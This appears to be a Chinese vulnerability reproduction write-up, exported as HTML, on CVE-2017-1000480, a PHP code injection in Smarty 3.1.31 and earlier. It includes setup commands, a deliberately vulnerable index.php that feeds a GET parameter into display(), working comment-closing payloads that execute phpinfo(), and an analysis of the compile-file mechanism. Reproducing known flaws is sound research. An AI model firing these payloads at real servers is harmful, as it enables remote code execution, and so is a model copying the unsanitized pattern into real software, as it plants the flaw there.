<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs98083A41{color:#000000;background-color:transparent;font-family:MS Gothic;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.csDFAC8B64{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:italic;}
			.cs2F00A314{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:italic;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="Xaffaaf443d0973f9301791e07e5d4a2c2cd0ea2"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2017-1000480</span><span class="csECDA2D3">）</span><span class="csDE05BCC">Smarty&lt;=3.1.31 </span><span class="csECDA2D3">命令执行</span><span class="csDE05BCC">RCE</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">在不清理模板名称的自定义资源上调用</span><span class="cs8926E06">fetch</span><span class="cs9C1B1871">（）或</span><span class="cs8926E06">display</span><span class="cs9C1B1871">（）函数时，</span><span class="cs8926E06">3.1.32</span><span class="cs9C1B1871">之前的</span><span class="cs8926E06">Smarty 3</span><span class="cs9C1B1871">容易受到</span><span class="cs8926E06">PHP</span><span class="cs9C1B1871">代码注入的攻击。</span></p><h2 class="cs868C439D">
			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Smarty&lt;=3.1.31</span><span class="cs9C1B1871">、</span><span class="cs8926E06">3.1.32-dev</span></p><h2 class="cs868C439D">
			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="Xb1665b262bfe01466ef10166f690f65133384fb"><span class="csD1E291E2">1</span><span class="csD6CA00D2">、搭建环境</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">测试环境为：</span><span class="cs8926E06"> PHP5.6.40+Apache2+Smarty3.1.31+Debian9</span></p><p class="cs3A447A38"><span class="cs98083A41">➜</span><span class="cs9FB05234"> &nbsp;html mkdir smarty</span><span class="cs8926E06"><br/></span><span class="cs98083A41">➜</span><span class="cs9FB05234"> &nbsp;html cd smarty</span><span class="cs8926E06"><br/></span><span class="cs98083A41">➜</span><span class="cs9FB05234"> &nbsp;smarty mkdir cache compile templates</span><span class="cs8926E06"><br/></span><span class="cs98083A41">➜</span><span class="cs9FB05234"> &nbsp;smarty composer require smarty/smarty -v</span><span class="cs8926E06"><br/></span><span class="cs98083A41">➜</span><span class="cs9FB05234"> &nbsp;smarty sed -i -e &#39;s/\^3.1/3.1.31/g&#39; composer.json</span><span class="cs8926E06"><br/></span><span class="cs98083A41">➜</span><span class="cs9FB05234"> &nbsp;smarty composer update</span><span class="cs8926E06"><br/></span><span class="cs98083A41">➜</span><span class="cs9FB05234"> &nbsp;smarty sudo chmod -R 777 .</span></p><p class="cs40DD2BC9"><span class="cs8926E06">/var/www/html/smarty/index.php </span><span class="cs9C1B1871">如下：</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">require &#39;./vendor/autoload.php&#39;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">class Smarty_Resource_Widget extends Smarty_Resource_Custom</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;protected function fetch($name, &amp;$source, &amp;$mtime)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$template = &quot;Smarty &lt;=3.1.31 RCE (CVE-2017-1000480)&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$source = $template;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$mtime = time();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return &#39;mochazz&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">$smarty = new Smarty();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$smarty-&gt;setCacheDir(&#39;cache&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$smarty-&gt;setCompileDir(&#39;compile&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$smarty-&gt;setTemplateDir(&#39;templates&#39;);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">$my_security_policy = new Smarty_Security($smarty);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$smarty-&gt;enableSecurity($my_security_policy);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$smarty-&gt;registerResource(&#39;username&#39;, new Smarty_Resource_Widget());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$smarty-&gt;display(&#39;username:&#39;.$_GET[&#39;mochazz&#39;]);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">?&gt;</span></p><h3 class="cs868C439D">
			<a name="Xafc7422fdc4a31f90748e94e15f3617f2b53a6b"><span class="csD1E291E2">2</span><span class="csD6CA00D2">、漏洞分析</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">具体攻击</span><span class="cs8926E06"> payload </span><span class="cs9C1B1871">如下：</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://0-sec.org/index.php?mochazz=*/phpinfo();/*</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Smarty/%ef%bc%88CVE-2017-1000480%ef%bc%89Smarty_=3.1.31%20%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8cRCE_files/image0.jpg" width="560" height="143" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">我们直接从</span><span class="cs8926E06"> display </span><span class="cs9C1B1871">方法开始跟进，会发现其最终会调用</span><span class="cs8926E06"> render </span><span class="cs9C1B1871">方法。在</span><span class="cs8926E06"> render </span><span class="cs9C1B1871">方法分别进行了：生成</span><span class="cs8926E06">compile</span><span class="cs9C1B1871">文件名、写入</span><span class="cs8926E06">compile</span><span class="cs9C1B1871">文件并包含两个操作。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Smarty/%ef%bc%88CVE-2017-1000480%ef%bc%89Smarty_=3.1.31%20%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8cRCE_files/image1.jpg" width="560" height="296" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在第一个操作：生成</span><span class="cs8926E06">compile</span><span class="cs9C1B1871">文件名时，我们传入</span><span class="cs8926E06"> display </span><span class="cs9C1B1871">的参数会影响最终的</span><span class="cs8926E06"> compile </span><span class="cs9C1B1871">文件名。例如下面两个</span><span class="cs8926E06"> payload </span><span class="cs9C1B1871">生成的文件名是不一样的。</span></p><p class="cs3A447A38"><span class="cs9FB05234"># </span><span class="cs7FFD2630">代码：</span><span class="cs9FB05234">$smarty-&gt;display(&#39;username:&#39;.$_GET[&#39;mochazz&#39;]);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># payload1</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">http://0.0.0.0/smarty/index.php?mochazz=*/phpinfo();/*</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">4f97532c32c10229713a39421c918cf16663bf6e_0.username.*.php</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># payload2</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">http://0.0.0.0/smarty/index.php?mochazz=*/phpinfo();//</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">1e95a2d156a7edd4f6130643849a588dce4acb27_0.username.phpinfo();.php</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这是因为</span><span class="cs8926E06"> compile </span><span class="cs9C1B1871">文件名中，有一部分由</span><span class="cs8926E06"> basename($source-&gt;name) </span><span class="cs9C1B1871">决定，这部分就是我们传入的</span><span class="cs8926E06"> mochazz </span><span class="cs9C1B1871">参数。使用上面第一个</span><span class="cs8926E06"> payload </span><span class="cs9C1B1871">时，文件名就会包含</span><span class="cs8926E06"> </span><span class="csDFAC8B64">号。在</span><span class="cs2F00A314"> Linux </span><span class="csDFAC8B64">系统下，文件名允许包含</span><span class="cs8926E06"> </span><span class="cs9C1B1871">号，但是</span><span class="cs8926E06"> Windows </span><span class="cs9C1B1871">却不允许，这也是网络上部分文章说这个漏洞无法在</span><span class="cs8926E06"> Windows </span><span class="cs9C1B1871">平台下利用。但是我们使用第二个</span><span class="cs8926E06"> payload </span><span class="cs9C1B1871">，两个平台就都可以利用。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">我们接着看第二个操作：写入</span><span class="cs8926E06"> compile </span><span class="cs9C1B1871">文件并包含。首先，写入</span><span class="cs8926E06"> compile </span><span class="cs9C1B1871">文件中的内容包含模板路径（即下图最后一行代码</span><span class="cs8926E06"> $_template-&gt;source-&gt;filepath </span><span class="cs9C1B1871">），这个模板路径就是我们传入</span><span class="cs8926E06"> display </span><span class="cs9C1B1871">方法的参数。虽然该参数被注释包裹，但是我们可以用</span><span class="cs8926E06"> */ </span><span class="cs9C1B1871">闭合。写入</span><span class="cs8926E06"> compile </span><span class="cs9C1B1871">文件，程序就开始包含该文件，最终导致代码执行（下图第</span><span class="cs8926E06">137</span><span class="cs9C1B1871">行）。</span></p><p class="cs40DD2BC9"><span class="cs8926E06">image</span></p></body>
</html>
